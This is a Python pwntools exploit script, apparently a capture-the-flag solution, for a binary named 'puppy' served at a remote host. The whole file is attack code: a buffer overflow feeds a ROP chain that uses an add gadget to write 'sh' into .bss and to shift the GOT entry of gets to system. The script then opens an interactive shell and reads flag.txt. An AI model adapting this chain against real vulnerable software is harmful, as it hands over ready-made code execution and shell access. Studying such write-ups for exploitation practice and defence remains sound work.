#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = 'error'


exe = ELF('./puppy_patched')
libc = ELF('./libc.so.6')
rop = ROP(exe)

host, port = "mc.ax", "31819"

if args.REMOTE or args.DOCKER:
  p = remote(host,port)
else:
  p = process(exe.path)

buff = exe.bss(0xa00)			# a buffer on bss+0xa00 around
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]
gadget_add = 0x000000000040111c # add dword ptr [rbp - 0x3d], ebx ; nop ; ret
set_csu = next(exe.search(asm('pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret'), executable = True))

def add_gadget(address, val):
  global gadget_add
  global set_csu
  return p64(set_csu)+p64(val & 0xffffffff)+p64(address+0x3d)+p64(0)*4+p64(gadget_add)

# write a string to memory with add gadget
def write_string(addr, data):
  data += '\x00'*(4-(len(data)%4))              # pad to a multiple of 4
  p = ''
  for i in range(len(data)>>2):
    p += add_gadget(addr+(i<<2), u32(data[(i<<2):(i<<2)+4]))
  return p

payload = 'A'*0x18
# write "sh" string to .bss
payload += write_string(buff, 'sh\x00')
# change gets got entry to system
payload += add_gadget(exe.got['gets'], libc.sym['system'] - libc.sym['gets'])
# call system("sh")
payload += p64(ret)+p64(pop_rdi)+p64(buff)+p64(exe.sym['gets'])
p.sendline(payload)
# dump flag.txt
p.sendline('cat flag.txt\x00')

p.interactive()

